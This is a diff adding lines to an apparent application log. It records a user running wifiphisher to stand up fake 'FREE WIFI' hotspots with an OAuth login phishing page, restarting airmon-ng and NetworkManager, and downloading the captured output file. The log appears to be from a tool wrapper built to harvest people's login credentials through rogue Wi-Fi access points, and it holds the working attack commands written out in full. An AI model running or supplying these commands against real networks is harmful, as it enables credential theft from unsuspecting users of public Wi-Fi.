@@ -8,3 +8,10 @@
 2025-02-23 11:06:00 - User: Ritem - INFO - Process terminated by user
 2025-02-23 11:06:03 - User: Ritem - INFO - Executing scan command: wifiphisher --essid "FREE WIFI" -p oauth-login -kB
 2025-02-23 11:06:12 - User: Ritem - INFO - Executing custom command: wifiphisher --essid "SM FREE WIFI" -p oauth-login -kB > output.txt
+2025-03-07 14:55:19 - User: Ritem - INFO - Executing scan command: wifiphisher --essid "FREE WIFI" -p oauth-login -kB
+2025-03-07 14:55:21 - User: Ritem - INFO - Executing restart command: airmon-ng stop wfphshr-wlan0; service NetworkManager restart
+2025-03-07 14:55:23 - User: Ritem - INFO - Downloading output file
+2025-03-07 14:55:25 - User: Ritem - INFO - Downloading output file
+2025-03-07 14:55:27 - User: Ritem - INFO - Process terminated by user
+2025-03-07 14:55:39 - User: Ritem - INFO - Executing custom command: wifiphisher --essid "FREE WIFI" -p oauth-login -kB > output.txt
+2025-03-07 14:55:45 - User: Ritem - INFO - Executing scan command: wifiphisher --essid "FREE WIFI" -p oauth-login -kB
